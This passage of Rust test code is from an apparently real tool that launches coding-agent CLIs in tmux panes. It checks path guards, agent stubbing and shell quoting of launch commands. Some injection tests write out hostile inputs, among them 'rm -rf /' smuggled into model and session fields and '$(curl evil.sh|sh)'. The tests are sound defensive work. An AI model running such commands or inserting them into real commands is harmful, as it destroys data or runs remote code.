        for p in ["/private", "/private/etc", "/private/var", "/private/var/log"] {
            assert!(reject_sensitive_root(Path::new(p)).is_err(), "{p} should be refused");
        }
    }

    /// The rewrite the canonicalizing test rides on, pinned.
    ///
    /// Without this, that test would keep passing on a Mac for the wrong
    /// reason if `/etc` ever stopped being a symlink — every case would
    /// quietly collapse back into the literal one, which is the exact shape
    /// of the bug it was written for.
    #[cfg(target_os = "macos")]
    #[test]
    fn macos_really_does_hand_the_guard_a_private_path() {
        assert_eq!(Path::new("/etc").canonicalize().unwrap(), Path::new("/private/etc"));
        assert_eq!(Path::new("/var").canonicalize().unwrap(), Path::new("/private/var"));
        assert_eq!(Path::new("/tmp").canonicalize().unwrap(), Path::new("/private/tmp"));
    }

    /// A temp directory stays addable, on both platforms.
    ///
    /// This is the reason `/var` cannot be a blanket refusal: on a Mac the OS
    /// hands out `$TMPDIR` under `/var/folders`, so refusing all of `/var`
    /// refuses every scratch checkout a person could try Far Cooler on — and
    /// 83 tests across this crate and `farcooler-client`, which add exactly
    /// this as a root.
    ///
    /// The literal `/var/folders` case is spelled out as well as the real one,
    /// because on Linux `$TMPDIR` is `/tmp` and the carve-out would otherwise
    /// be unreachable there.
    #[test]
    fn a_temp_directory_is_still_addable() {
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        assert!(
            reject_sensitive_root(&canonical).is_ok(),
            "{} is per-user scratch space, not a system location",
            canonical.display()
        );

        for p in ["/var/folders/3c/abc/T/scratch", "/private/var/folders/3c/abc/T/scratch"] {
            assert!(reject_sensitive_root(Path::new(p)).is_ok(), "{p} is this user's own $TMPDIR");
        }
    }

    /// A prefix is a whole path component, not a string.
    #[test]
    fn a_name_that_merely_starts_like_a_system_path_is_allowed() {
        for p in ["/variants", "/etcetera", "/binaries", "/sbinary", "/usrs", "/privateer"] {
            assert!(reject_sensitive_root(Path::new(p)).is_ok(), "{p} is not a system location");
        }
    }

    #[test]
    fn the_home_directory_itself_is_refused() {
        if let Some(home) = std::env::var_os("HOME") {
            assert!(reject_sensitive_root(Path::new(&home)).is_err());
            // but a project directory inside it is fine
            let inside = Path::new(&home).join("Dev");
            assert!(reject_sensitive_root(&inside).is_ok());
        }
    }

    #[test]
    fn host_id_is_stable_for_an_install() {
        assert_eq!(stable_host_id("abc123"), stable_host_id("abc123"));
        assert_ne!(stable_host_id("abc123"), stable_host_id("def456"));
    }

    /// A service backed by its own throwaway database.
    ///
    /// `keep` rather than letting the `TempDir` drop: the guard would delete
    /// the directory the instant this function returns, before the caller
    /// ever opens it.
    async fn temp_service() -> Service {
        let dir = tempfile::tempdir().unwrap().keep();
        Service::open_in(dir).await.unwrap()
    }

    /// A workspace whose worktree is a real, empty directory a test can write
    /// into — everything `search_worktree_files` needs and nothing tmux or git
    /// would add, since this is a store-level fixture rather than a live one.
    async fn seed_workspace(service: &Service) -> models::Workspace {
        let worktree = tempfile::tempdir().unwrap().keep();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/worktree-search-root", now_millis())
            .unwrap();
        let repo = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/worktree-search-root/.git", "")
            .unwrap();
        service
            .store
            .create_workspace(repo.id, "branch", &worktree.display().to_string(), false)
            .unwrap()
    }

    #[tokio::test]
    async fn worktree_search_finds_a_file_that_git_has_never_seen() {
        // The @-mention case that matters: the file the agent just created.
        let service = temp_service().await;
        let ws = seed_workspace(&service).await;
        std::fs::write(
            std::path::Path::new(&ws.worktree_path).join("brand_new.rs"),
            "fn main() {}",
        )
        .unwrap();
        let hits = service.search_worktree_files(ws.id, "brand", 10).await.unwrap();
        assert_eq!(hits, vec!["brand_new.rs".to_string()]);
    }

    #[tokio::test]
    async fn worktree_search_never_offers_the_git_directory() {
        let service = temp_service().await;
        let ws = seed_workspace(&service).await;
        let git_dir = std::path::Path::new(&ws.worktree_path).join(".git");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/main").unwrap();
        let hits = service.search_worktree_files(ws.id, "", 500).await.unwrap();
        assert!(!hits.iter().any(|p| p.starts_with(".git/")), "{hits:?}");
    }

    /// `register_repository` is the only production caller of
    /// `Store::assign_task_key_prefix` — everything else that exercises it
    /// is this crate's own test helpers. Going through the real,
    /// fully-async `register_repository` here rather than calling
    /// `svc.store.assign_task_key_prefix` directly is the whole point: a
    /// test written the second way would prove the store-level mechanism
    /// works without proving registration ever reaches it, which is exactly
    /// the gap that shipped — `create_repository` alone leaves
    /// `task_key_prefix` at the schema's `''` default forever, and nothing
    /// before this test called `register_repository` and then checked.
    ///
    /// `crate::test_support::fixture()` registers through this exact
    /// function (see its own body), so this asserts against what it
    /// produced rather than repeating the registration call.
    #[tokio::test]
    async fn registering_a_repository_assigns_a_task_key_prefix() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let repository = svc.store.get_repository(repo).unwrap();

        // The fixture's worktree directory is named "repo" — a single,
        // four-letter word, so `derive_prefix` takes its first two letters.
        assert_eq!(
            repository.task_key_prefix, "re",
            "register_repository must have called assign_task_key_prefix, not left the \
             schema's '' default in place"
        );
        assert_eq!(
            svc.store.next_task_key(repo).unwrap(),
            "re-1",
            "a real prefix, not the bare '-1' an empty prefix would produce"
        );
        assert_eq!(
            repository.resource_version, 2,
            "create_repository left it at 1; the prefix assignment inside \
             register_repository must have bumped it once"
        );
    }

    /// Hiding never consults terminal state at all — proven structurally,
    /// since a genuinely `Running` derived state cannot be manufactured
    /// here.
    ///
    /// This is a store-level fixture with no live tmux pane behind it, so a
    /// terminal created with `TerminalIntent::Running` derives `Starting`,
    /// not `Running` (see `a_starting_terminal_blocks_removal_same_as_a_running_one`
    /// below, which asserts exactly that for the identical call — the old
    /// `archive_workspace` guard checked `== TerminalState::Running` only,
    /// so this scenario would not have been refused under the old code
    /// either). What this test can honestly prove instead: the workspace is
    /// demonstrably not idle — `workspace_view` reports it `Active`, the
    /// same state a truly running terminal would produce — and `hide_workspace`
    /// still succeeds unconditionally, because it never reads terminal state
    /// in the first place. The case of a truly `Running` terminal needs a
    /// live pane and belongs in an integration test with real tmux instead.
    #[tokio::test]
    async fn hiding_does_not_consult_terminal_state() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .next()
            .unwrap();
        svc.store
            .create_terminal(ws.id, "agent", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();

        let view = svc.workspace_view(&ws).await.unwrap();
        assert_eq!(
            view.state,
            WorkspaceState::Active,
            "the workspace must actually carry something alive for this test to mean anything: {view:?}"
        );

        let hidden = svc.hide_workspace(ws.id).await.unwrap();
        assert!(hidden.hidden);

        let back = svc.unhide_workspace(hidden.id).await.unwrap();
        assert!(!back.hidden);
    }

    #[test]
    fn switching_a_codex_pane_back_to_terminal_respawns_codex_not_claude() {
        // The regression this whole function exists to prevent: a codex pane
        // switched to chat and back used to hardcode `claude`, silently
        // handing the user a different agent in the same pane.
        let cmd = terminal_mode_command("codex", "", false, &LaunchExtras::NONE);
        assert!(cmd.contains("codex"), "must respawn codex: {cmd}");
        assert!(!cmd.contains("claude"), "must not respawn claude: {cmd}");
    }

    #[test]
    fn switching_an_opencode_or_cursor_pane_back_never_runs_claude() {
        // Not "cannot resume" — "not verified to". Neither CLI has been
        // checked end to end the way claude's and codex's have, so both keep
        // starting clean rather than guess at a flag.
        for preset in ["opencode", "cursor"] {
            let cmd = terminal_mode_command(preset, "", false, &LaunchExtras::NONE);
            assert!(!cmd.contains("claude"), "{preset} must not respawn claude: {cmd}");
        }
    }

    #[test]
    fn opencode_and_cursor_never_get_a_resume_flag_even_when_marked_resumable() {
        // `resumable: true` from a caller would be a caller bug for these two
        // presets — nothing computes it that way today — but this function's
        // own job is to never invent a flag for a CLI nobody has verified one
        // for, regardless of what it is told.
        for preset in ["opencode", "cursor"] {
            let cmd = terminal_mode_command(preset, "some-id", true, &LaunchExtras::NONE);
            assert!(!cmd.contains("resume"), "{preset} must not resume: {cmd}");
        }
    }

    #[test]
    fn a_resumable_claude_pane_still_gets_resume() {
        let sid = Uuid::now_v7().to_string();
        let cmd = terminal_mode_command("claude", &sid, true, &LaunchExtras::NONE);
        assert!(cmd.contains(&format!("claude --resume {sid}")), "{cmd}");
    }

    #[test]
    fn a_non_resumable_claude_pane_starts_clean() {
        let cmd = terminal_mode_command("claude", "some-id", false, &LaunchExtras::NONE);
        assert!(!cmd.contains("--resume"), "{cmd}");
        assert!(cmd.contains("claude"), "{cmd}");
    }

    #[test]
    fn a_resumable_codex_pane_gets_codex_resume() {
        // Verified end to end on a real machine: `codex resume <uuid>`
        // restores the conversation when `codex-acp` wrote a rollout for it.
        let sid = Uuid::now_v7().to_string();
        let cmd = terminal_mode_command("codex", &sid, true, &LaunchExtras::NONE);
        assert!(cmd.contains(&format!("codex resume {sid}")), "{cmd}");
    }

    #[test]
    fn a_non_resumable_codex_pane_starts_clean() {
        // The codex equivalent of claude's "No conversation found": a session
        // id with no completed turn wrote no rollout, and `codex resume`
        // on it fails with an error the user cannot act on.
        let cmd = terminal_mode_command("codex", "some-id", false, &LaunchExtras::NONE);
        assert!(!cmd.contains("resume"), "{cmd}");
        assert!(cmd.contains("codex"), "{cmd}");
    }

    #[test]
    fn an_empty_preset_falls_back_to_a_clean_shell_not_claude() {
        // `command_preset` is always written by `create_terminal`, so empty
        // means "never been an agent pane", not "forgot it was claude".
        let cmd = terminal_mode_command("", "", false, &LaunchExtras::NONE);
        assert!(!cmd.contains("claude"), "{cmd}");
    }
}

/// The stub every daemon unit test launches in place of an agent
/// (`agent_program`, `test_agent`), and the check that refuses a real one.
#[cfg(test)]
mod test_agent_tests {
    use super::*;

    /// Every command a launch path can build for an agent, under test with
    /// no guard: the three agent arms and the `other` arm of the launch
    /// builder, and both resume commands. The shim's command is built inline
    /// in `set_pane_mode`; `switching_a_claude_pane_into_agent_mode_runs_the_shim`
    /// sends it through the refusal below on its way to tmux.
    fn every_agent_launch() -> Vec<(&'static str, String)> {
        let sid = Uuid::now_v7().to_string();
        let extras = LaunchExtras::NONE;
        vec![
            ("claude", preset_command_with_hooks("claude", Some(&sid), &extras)),
            ("claude:opus", preset_command_with_hooks("claude:opus", None, &extras)),
            ("codex", preset_command_with_hooks("codex", None, &extras)),
            ("cursor", preset_command_with_hooks("cursor", None, &extras)),
            ("opencode", preset_command_with_hooks("opencode", None, &extras)),
            ("claude --resume", terminal_mode_command("claude", &sid, true, &extras)),
            ("codex resume", terminal_mode_command("codex", &sid, true, &extras)),
        ]
    }

    #[test]
    fn every_agent_launch_runs_the_stub_under_test() {
        for (what, command) in every_agent_launch() {
            assert!(command.contains(test_agent::MARKER), "{what} must launch the stub: {command}");
            test_agent::refuse_a_real_agent(&command);
        }
    }

    /// The same launches with `real_names()` held: the builders write the
    /// real program, and every one of them is refused at the tmux boundary.
    #[test]
    fn a_launch_built_with_real_names_is_refused() {
        let _real = test_agent::real_names();
        for (what, command) in every_agent_launch() {
            assert!(!command.contains(test_agent::MARKER), "{what} is the real program under real_names: {command}");
            let refused = std::panic::catch_unwind(|| test_agent::refuse_a_real_agent(&command));
            // By the guard, not by the word check, which would refuse most
            // of these on its own and so could hide a guard that does nothing.
            let message = refused
                .err()
                .and_then(|p| p.downcast::<String>().ok())
                .unwrap_or_else(|| panic!("{what} would have started for real: {command}"));
            assert!(message.contains("test_agent::real_names()"), "{what} refused for another reason: {message}");
        }
        // A command with no agent in it at all: only the guard can refuse it.
        let shell = farcooler_core::shell::login_shell();
        let refused = std::panic::catch_unwind(|| test_agent::refuse_a_real_agent(&format!("{shell} -il")));
        assert!(refused.is_err(), "anything built under real_names() is refused at the boundary");
    }

    /// The content check alone, with no guard held: a program word that was
    /// written without `agent_program` in front of it -- what a new launch
    /// path that forgot it would produce -- is refused, and words that only
    /// mention an agent after the stub are not.
    #[test]
    fn an_agent_word_with_no_stub_in_front_is_refused() {
        let shell = farcooler_core::shell::login_shell();
        for command in [
            format!("{shell} -ilc 'claude --resume x'"),
            format!("env A=b {shell} -ilc 'codex resume x'"),
            format!("{shell} -ilc 'cursor-agent --trust'"),
            "'/Applications/Far Cooler.app/Contents/MacOS/farcooler' agent-host --terminal x".to_string(),
            format!("{shell} -ilc '/opt/homebrew/bin/claude --resume x'"),
            format!("{shell} -ilc 'claude;'"),
            format!("{shell} -ilc \"$(command -v codex) resume x\""),
            format!("{shell} -ilc 'opencode'"),
            // A stubbed launch does not excuse a real one after it.
            format!("{shell} -ilc '{} claude; codex'", test_agent::PROGRAM),
        ] {
            let refused = std::panic::catch_unwind(|| test_agent::refuse_a_real_agent(&command));
            assert!(refused.is_err(), "not refused: {command}");
        }
        test_agent::refuse_a_real_agent(&format!("{shell} -il"));
        test_agent::refuse_a_real_agent(&format!("{shell} -ilc '{} claude --prompt \"ask codex\"'", test_agent::PROGRAM));
        test_agent::refuse_a_real_agent(&format!(
            "{} '/Applications/Far Cooler.app/Contents/MacOS/farcooler' agent-host --terminal x",
            test_agent::PROGRAM
        ));
    }
}

#[cfg(test)]
mod preset_tests {
    use super::*;

    #[test]
    fn a_bare_preset_runs_the_agent() {
        // Real names: this checks the exact string the builder writes, and launches nothing.
        let _real = crate::service::test_agent::real_names();
        assert!(preset_command_with_hooks("claude", None, &LaunchExtras::NONE).contains("'claude'"));
        // codex carries its update-check flag on every launch; see the
        // `"codex"` arm.
        assert!(
            preset_command_with_hooks("codex", None, &LaunchExtras::NONE)
                .contains("'codex -c check_for_update_on_startup=false'")
        );
        assert!(preset_command_with_hooks("cursor", None, &LaunchExtras::NONE).contains("'cursor-agent'"));
        assert!(preset_command_with_hooks("shell", None, &LaunchExtras::NONE).ends_with("-il"));
    }

    #[test]
    fn a_model_is_passed_through() {
        assert!(preset_command_with_hooks("claude:opus", None, &LaunchExtras::NONE).contains("claude --model opus"));
        assert!(preset_command_with_hooks("codex:gpt-5.6-sol", None, &LaunchExtras::NONE).contains("codex --model gpt-5.6-sol"));
    }

    #[test]
    fn a_model_that_is_not_an_identifier_is_dropped_not_escaped() {
        // Real names: this checks the exact string the builder writes, and launches nothing.
        let _real = crate::service::test_agent::real_names();
        // This string reaches a `-ilc` argument. Dropping it loses nothing real
        // and leaves no argument about quoting.
        let out = preset_command_with_hooks("claude:opus'; rm -rf /; '", None, &LaunchExtras::NONE);
        assert!(!out.contains("rm -rf"));
        assert!(out.contains("'claude'"));
    }

    #[test]
    fn an_unrecognized_preset_that_is_not_an_identifier_runs_nothing() {
        let out = preset_command_with_hooks("$(curl evil.sh|sh)", None, &LaunchExtras::NONE);
        assert!(!out.contains("curl"));
        assert!(out.ends_with("-il"), "falls back to a plain shell");
    }

    #[test]
    fn a_custom_agent_name_still_works() {
        // Real names: this checks the exact string the builder writes, and launches nothing.
        let _real = crate::service::test_agent::real_names();
        // Presets are not a closed set: someone's own wrapper should run.
        assert!(preset_command_with_hooks("aider", None, &LaunchExtras::NONE).contains("'aider'"));
        assert!(preset_command_with_hooks("aider:sonnet", None, &LaunchExtras::NONE).contains("aider --model sonnet"));
    }

    /// The task brief writes this test with `Some("a-session")` and asserts
    /// `--session-id a-session` comes back. It cannot: `preset_command` drops
    /// any session id that is not a plain uuid (see
    /// `a_session_id_that_is_not_a_uuid_is_dropped_rather_than_escaped`
    /// below), so the brief's literal would be filtered out before it reached
    /// the command and the assertion would fail against a correct
    /// implementation. A real uuid, which is what `create_terminal` mints,
    /// asks the same question the brief meant to ask.
    #[test]
    fn a_claude_pane_is_launched_with_far_coolers_settings() {
        const SESSION: &str = "018f5b2c-0000-7000-8000-00000000000a";
        let command = preset_command_with_hooks(
            "claude",
            Some(SESSION),
            &LaunchExtras::settings_only(Path::new("/tmp/fc/hooks.json")),
        );
        assert!(command.contains("--settings"), "a launched pane reports what it is doing: {command}");
        assert!(
            command.contains(&format!("--session-id {SESSION}")),
            "and still declares its session: {command}"
        );
    }

    /// A settings path with a space in it must not split into two arguments.
    #[test]
    fn the_settings_path_is_quoted_like_every_other_interpolation_here() {
        let command =
            preset_command_with_hooks("claude", None, &LaunchExtras::settings_only(Path::new("/tmp/My Runner/hooks.json")));
        assert!(
            command.contains("'/tmp/My Runner/hooks.json'")
                || command.contains("\"/tmp/My Runner/hooks.json\""),
            "tmux hands this to a shell: {command}"
        );
    }

    #[test]
    fn a_pane_with_no_hook_settings_is_the_command_it_always_was() {
        // Real names: this checks the exact string the builder writes, and launches nothing.
        let _real = crate::service::test_agent::real_names();
        // The task brief wrote this as an equality against a two-argument
        // `preset_command`. That function is gone — it had no production
        // caller and was a trap — and comparing this function against itself
        // is a tautology, so the claim is made the way it should have been in
        // the first place: against the literal string, which is what "nothing
        // about an existing launch changes" actually means. A stray
        // `--settings`, a lost `-ilc`, or the quoting drifting would all fail
        // here; the equality could not have caught any of them.
        let shell = farcooler_core::shell::login_shell();
        assert_eq!(
            preset_command_with_hooks("claude", None, &LaunchExtras::NONE),
            format!("{shell} -ilc 'claude'"),
            "hooks are additive; nothing about an existing launch changes"
        );
        assert_eq!(
            preset_command_with_hooks("claude:opus", Some("018f5b2c-0000-7000-8000-000000000000"), &LaunchExtras::NONE),
            format!("{shell} -ilc 'claude --model opus --session-id 018f5b2c-0000-7000-8000-000000000000'"),
            "and the model and session id land exactly where they always did"
        );
    }

    /// `--settings` is claude's flag alone. Handed to codex or cursor it would
    /// be an argument the CLI does not understand sitting in front of it, and
    /// the pane would die on startup rather than merely stay quiet — the
    /// worst possible trade for a feature that is meant to be invisible.
    /// Those two are registered by `install_project_hooks` instead.
    #[test]
    fn no_other_agent_is_handed_claudes_settings_flag() {
        for preset in ["codex", "cursor", "shell", "aider", "claude-ish"] {
            let with = preset_command_with_hooks(preset, None, &LaunchExtras::settings_only(Path::new("/tmp/fc/h.json")));
            assert!(!with.contains("--settings"), "{preset}: {with}");
            assert_eq!(with, preset_command_with_hooks(preset, None, &LaunchExtras::NONE), "{preset}: {with}");
        }
    }

    /// The bug the nested quoting exists to prevent, asked of two real
    /// shells rather than of a substring.
    ///
    /// `preset_command` produces `<shell> -ilc '<payload>'`, and tmux hands
    /// that whole string to `sh -c`. So the settings path is inside two
    /// layers of quoting, and the single quotes `shell_quote` writes would
    /// close the `-ilc` argument early if the payload were not itself quoted.
    /// A substring assertion cannot see that — the broken string contains the
    /// quoted path too. This runs both layers and reads the argv that comes
    /// out the far end: `claude` is swapped for a `printf` whose format joins
    /// its arguments with commas, so a path that split into two words shows
    /// up as two fields.
    #[cfg(unix)]
    #[test]
    fn the_settings_path_survives_both_shells_as_one_argument() {
        // Real names: runs the builder's command through a shell with the agent swapped for printf; nothing reaches tmux.
        let _real = crate::service::test_agent::real_names();
        let path = "/tmp/My Runner/hooks.json";
        let command = preset_command_with_hooks("claude", None, &LaunchExtras::settings_only(Path::new(path)));

        // The login shell is whatever this machine's user has; `sh` is enough
        // to parse the `-ilc` payload and is the same parser in the way that
        // matters here. Interactive login startup files are not this test's
        // subject and would make it depend on somebody's `.zshrc`.
        let prefix = format!("{} -ilc", farcooler_core::shell::login_shell());
        let probe = command.replace(&prefix, "/bin/sh -c").replace("claude", "printf ,%s");
        assert!(probe.starts_with("/bin/sh -c"), "the prefix was found and replaced: {probe}");

        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&probe)
            .output()
            .expect("run the probe");
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert_eq!(
            stdout, format!(",--settings,{path}"),
            "the path arrives as one argument through both shells: {probe} -> {stdout}"
        );
    }

    /// Run a claude launch command through both of its shells with `claude`
    /// swapped for a `printf` that joins its arguments with commas, and return
    /// what came out: a path that split in two shows up as two fields. The
    /// technique is `the_settings_path_survives_both_shells_as_one_argument`'s.
    #[cfg(unix)]
    pub(super) fn claude_argv_through_both_shells(command: &str) -> String {
        argv_through_both_shells(command, "claude")
    }

    /// The same probe for any program's launch.
    pub(super) fn argv_through_both_shells(command: &str, program: &str) -> String {
        let prefix = format!("{} -ilc", farcooler_core::shell::login_shell());
        // The FIRST occurrence only: it is the program, and the paths after it
        // can hold the word (a temp directory's name, say).
        let probe = crate::service::test_agent::unstubbed(command)
            .replacen(&prefix, "/bin/sh -c", 1)
            .replacen(program, "printf ,%s", 1);
        assert!(probe.starts_with("/bin/sh -c"), "the prefix was found and replaced: {probe}");
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&probe)
            .output()
            .expect("run the probe");
        String::from_utf8_lossy(&out.stdout).into_owned()
    }

    /// Beside `--settings`, through both shells, as one argument each: the
    /// runtime directory on macOS is under `Application Support`, with a
    /// space, for every user.
    #[cfg(unix)]
    #[test]
    fn a_claude_launch_carries_the_plugin_dir_as_one_argument() {
        let (s, p) = ("/tmp/My Runner/hooks.json", "/tmp/My Runner/claude-plugin");
        let extras = LaunchExtras { settings: Some(s.into()), plugin_dir: Some(p.into()), ..LaunchExtras::NONE };
        let command = preset_command_with_hooks("claude", None, &extras);
        assert_eq!(claude_argv_through_both_shells(&command), format!(",--settings,{s},--plugin-dir,{p}"));
    }

    /// `--plugin-dir` is claude's and cursor's, measured for both. codex has no
    /// such flag and would refuse to start; its copy of the skill comes from
    /// the worktree's `.agents/skills` instead. `--settings` stays claude's
    /// alone.
    #[test]
    fn only_claude_and_cursor_are_handed_a_plugin_dir() {
        let extras = LaunchExtras {
            settings: Some("/tmp/fc/h.json".into()),
            plugin_dir: Some("/tmp/fc/farcooler-plugin".into()),
            ..LaunchExtras::NONE
        };
        let sid = "018f5b2c-0000-7000-8000-00000000000e";
        for preset in ["codex", "codex:gpt-5.6-sol", "shell", "aider", CHANGES_PRESET] {
            let with = preset_command_with_hooks(preset, None, &extras);
            assert!(!with.contains("--plugin-dir"), "{preset}: {with}");
            for resumable in [false, true] {
                let back = terminal_mode_command(preset, sid, resumable, &extras);
                assert!(!back.contains("--plugin-dir"), "{preset} resumable={resumable}: {back}");
            }
        }
        for preset in ["claude", "claude:opus", "cursor", "cursor:auto"] {
            assert!(preset_command_with_hooks(preset, None, &extras).contains("--plugin-dir"), "{preset}");
            for resumable in [false, true] {
                let back = terminal_mode_command(preset, sid, resumable, &extras);
                assert!(back.contains("--plugin-dir"), "{preset} resumable={resumable}: {back}");
            }
        }
        for preset in ["cursor", "cursor:auto"] {
            let with = preset_command_with_hooks(preset, None, &extras);
            assert!(!with.contains("--settings"), "cursor has no --settings: {with}");
        }
    }

    /// cursor's launch, through both shells: the runtime directory has a
    /// space in it on macOS, and the plugin path must arrive as one argument.
    /// The model flag stays where it was.
    #[cfg(unix)]
    #[test]
    fn a_cursor_launch_carries_the_plugin_dir_as_one_argument() {
        let p = "/tmp/My Runner/farcooler-plugin";
        let extras = LaunchExtras { settings: Some("/tmp/My Runner/h.json".into()), plugin_dir: Some(p.into()), ..LaunchExtras::NONE };
        let command = preset_command_with_hooks("cursor:auto", None, &extras);
        assert_eq!(argv_through_both_shells(&command, "cursor-agent"), format!(",--model,auto,--plugin-dir,{p}"));
    }

    #[test]
    fn a_claude_terminal_is_launched_with_the_session_id_we_chose() {
        // So that switching this pane to agent mode later is a lookup rather
        // than a guess about which of several .jsonl files is ours.
        let cmd = preset_command_with_hooks("claude", Some("018f5b2c-0000-7000-8000-000000000000"), &LaunchExtras::NONE);
        assert!(cmd.contains("--session-id 018f5b2c-0000-7000-8000-000000000000"), "{cmd}");
    }

    #[test]
    fn a_shell_is_not_given_a_session_id() {
        let cmd = preset_command_with_hooks("shell", Some("018f5b2c-0000-7000-8000-000000000000"), &LaunchExtras::NONE);
        assert!(!cmd.contains("--session-id"), "{cmd}");
    }

    #[test]
    fn a_session_id_that_is_not_a_uuid_is_dropped_rather_than_escaped() {
        // It ends up inside a `-ilc` string. The existing rule for models
        // applies here for the same reason.
        let cmd = preset_command_with_hooks("claude", Some("; rm -rf /"), &LaunchExtras::NONE);
        assert!(!cmd.contains("rm -rf"), "{cmd}");
        assert!(!cmd.contains("--session-id"), "{cmd}");
    }

    #[test]
    fn the_shim_is_the_cli_beside_the_daemon_not_the_daemon_itself() {
        // Found end to end, not by a test: the pane ran `farcoolerd agent-host`,
        // which ignored its arguments and exited 0. The pane died instantly and
        // the terminal derived as an exit nobody caused, while set-pane-mode
        // reported success — agent mode was completely broken and said nothing.
        let dir = std::env::temp_dir().join(format!("farcooler-shim-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let daemon = dir.join("farcoolerd");
        std::fs::write(&daemon, "").unwrap();
        std::fs::write(dir.join("farcooler"), "").unwrap();

        assert_eq!(shim_binary(Some(&daemon)), dir.join("farcooler").display().to_string());
        assert!(!shim_binary(Some(&daemon)).ends_with("farcoolerd"));
    }

    #[test]
    fn a_daemon_installed_without_its_cli_beside_it_falls_back_to_the_path() {
        let dir = std::env::temp_dir().join(format!("farcooler-shim-alone-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let daemon = dir.join("farcoolerd");
        std::fs::write(&daemon, "").unwrap();
        // No sibling CLI: naming a path that does not exist would fail in the
        // pane with no explanation, so PATH is the better guess.
        let on_path = farcooler_protocol::CHANNEL.cli_binary_name();
        assert_eq!(shim_binary(Some(&daemon)), on_path);
        assert_eq!(shim_binary(None), on_path);
    }

    /// `~/.local/bin` holds every channel a runner has installed, so the CLI
    /// beside the daemon is ambiguous by name alone. An agent pane opened by
    /// the preview daemon that ran the release `farcooler` would attach to the
    /// release daemon's fleet, and the pane would look fine while belonging to
    /// the wrong side of the isolation.
    #[test]
    fn the_shim_is_this_channels_cli_when_several_are_installed() {
        let dir = std::env::temp_dir().join(format!("farcooler-shim-ch-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let daemon = dir.join(farcooler_protocol::CHANNEL.daemon_binary_name());
        std::fs::write(&daemon, "").unwrap();
        for name in farcooler_protocol::CHANNEL.cli_binary_candidates() {
            std::fs::write(dir.join(name), "").unwrap();
        }

        assert_eq!(
            shim_binary(Some(&daemon)),
            dir.join(farcooler_protocol::CHANNEL.cli_binary_name()).display().to_string()
        );
    }

    #[test]
    fn a_path_with_a_space_survives_becoming_a_shell_command() {
        // The failure this prevents is total rather than partial: a worktree
        // under `~/My Projects` splits into two arguments, `agent-host` is
        // handed a --worktree it cannot use, and agent mode is simply broken
        // for that user with nothing on screen explaining why.
        assert_eq!(shell_quote("/Users/e/My Projects/app"), "'/Users/e/My Projects/app'");
    }

    #[test]
    fn a_quote_in_a_path_cannot_end_the_quoting() {
        // Single quotes protect everything except a single quote, so that one
        // character has to be closed, escaped and reopened — otherwise a path
        // containing one ends the quoted run and whatever follows is read as
        // shell syntax.
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }

    #[test]
    fn a_real_shell_reads_back_exactly_what_was_quoted() {
        // Asserted against a shell rather than against the escaped text,
        // because the escaped text is not the thing that has to be right — the
        // shell's reading of it is. An earlier version of this test checked
        // that the output did not contain `'; rm`, which correct escaping
        // produces anyway, and so proved nothing.
        for original in [
            "/Users/e/My Projects/app",
            "it's",
            "/tmp/a'; rm -rf /; echo '",
            "$HOME/`whoami`",
            "a\"b",
            "back\\slash",
        ] {
            let out = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(format!("printf %s {}", shell_quote(original)))
                .output()
                .expect("run a shell");
            assert_eq!(
                String::from_utf8_lossy(&out.stdout),
                original,
                "a shell did not read back {original:?} unchanged"
            );
        }
    }
}


/// A path in its canonical form, or unchanged when it cannot be resolved.
///
/// Comparing worktree paths by string alone would offer an already-registered
/// worktree as new whenever git and the database spelled the same directory
/// differently — a symlinked home, a trailing slash, `/var` against
/// `/private/var`. A path that no longer exists cannot be canonicalised, and
/// falling back to the raw string keeps it comparable with itself.
pub fn canonical_or_raw(path: &str) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| PathBuf::from(path))
}

#[cfg(test)]
mod restart_wiring_tests {
    use super::*;

    /// What tmux was actually told to run in this terminal's pane.
    ///
    /// `pane_start_command`, not `pane_current_command`: the second is a
    /// process NAME, so every one of these panes reads back as the login
    /// shell and the flags — the entire subject of this test — are invisible.
    /// The first is the string tmux was handed, which is exactly the thing
    /// `restart_terminal` builds.
    pub(super) async fn pane_start_command(svc: &Service, terminal: Uuid) -> String {
        let snapshot = svc.inventory.refresh().await;
        let pane = snapshot
            .claimants(terminal)
            .into_iter()
            .next()
            .expect("the restart made a pane")
            .clone();
        let out = svc
            .tmux
            .run(&["display-message", "-p", "-t", &pane.pane_id, "#{pane_start_command}"])
            .await
            .expect("tmux answered");
        out.stdout.trim().to_string()
    }

    /// A workspace on a real directory, on the fixture's private tmux server.
    pub(super) async fn a_workspace()
    -> (crate::test_support::ScratchDir, Arc<Service>, models::Workspace) {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        crate::reconcile::repository(&svc, repo).await.unwrap();
        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .next()
            .expect("reconcile adopted the main checkout");
        (dir, svc, ws)
    }

    #[tokio::test]
    async fn restarting_a_claude_pane_does_not_name_a_brand_new_conversation() {
        // The wiring, not the builder. `respawn_tests` proves the command is
        // right; nothing there notices which builder `restart_terminal` calls,
        // and calling the wrong one is the entire bug. So this drives the real
        // method against a real tmux server and reads back the string the pane
        // was launched with.
        //
        // `--session-id` is the tell, and it is a tell only this path has:
        // it appears in `preset_command_with_hooks`'s claude arm and nowhere
        // else, it names a NEW session rather than resuming one, and
        // restoring `restart_terminal` to
        // `preset_command_with_hooks(&term.command_preset,
        // term.agent_session_id.as_deref(), hook_settings.as_deref())` puts it
        // straight back.
        //
        // There is deliberately no transcript planted for this session, so the
        // command lands on the clean-start branch. Planting one would mean
